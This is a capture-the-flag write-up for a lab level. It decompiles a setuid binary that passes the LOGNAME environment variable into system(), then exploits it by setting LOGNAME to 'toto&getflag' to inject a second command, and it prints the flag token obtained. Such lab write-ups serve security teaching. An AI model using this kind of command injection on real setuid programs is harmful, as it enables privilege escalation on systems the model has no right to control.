## Solutions

```console
~$ ls -l
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Executable found, owner is flag07
let's exploit it

```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

`asprintf` allocats and sets `local_1c` with `/bin/echo + getenv("LOGNAME")`  
Then the exec calls `system(local_1c)` and return the value

Lets change the value of LOGNAME to get the flag

```console
~$ env | grep LOGNAME
LOGNAME=level07
~$ export LOGNAME="toto&getflag"
~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
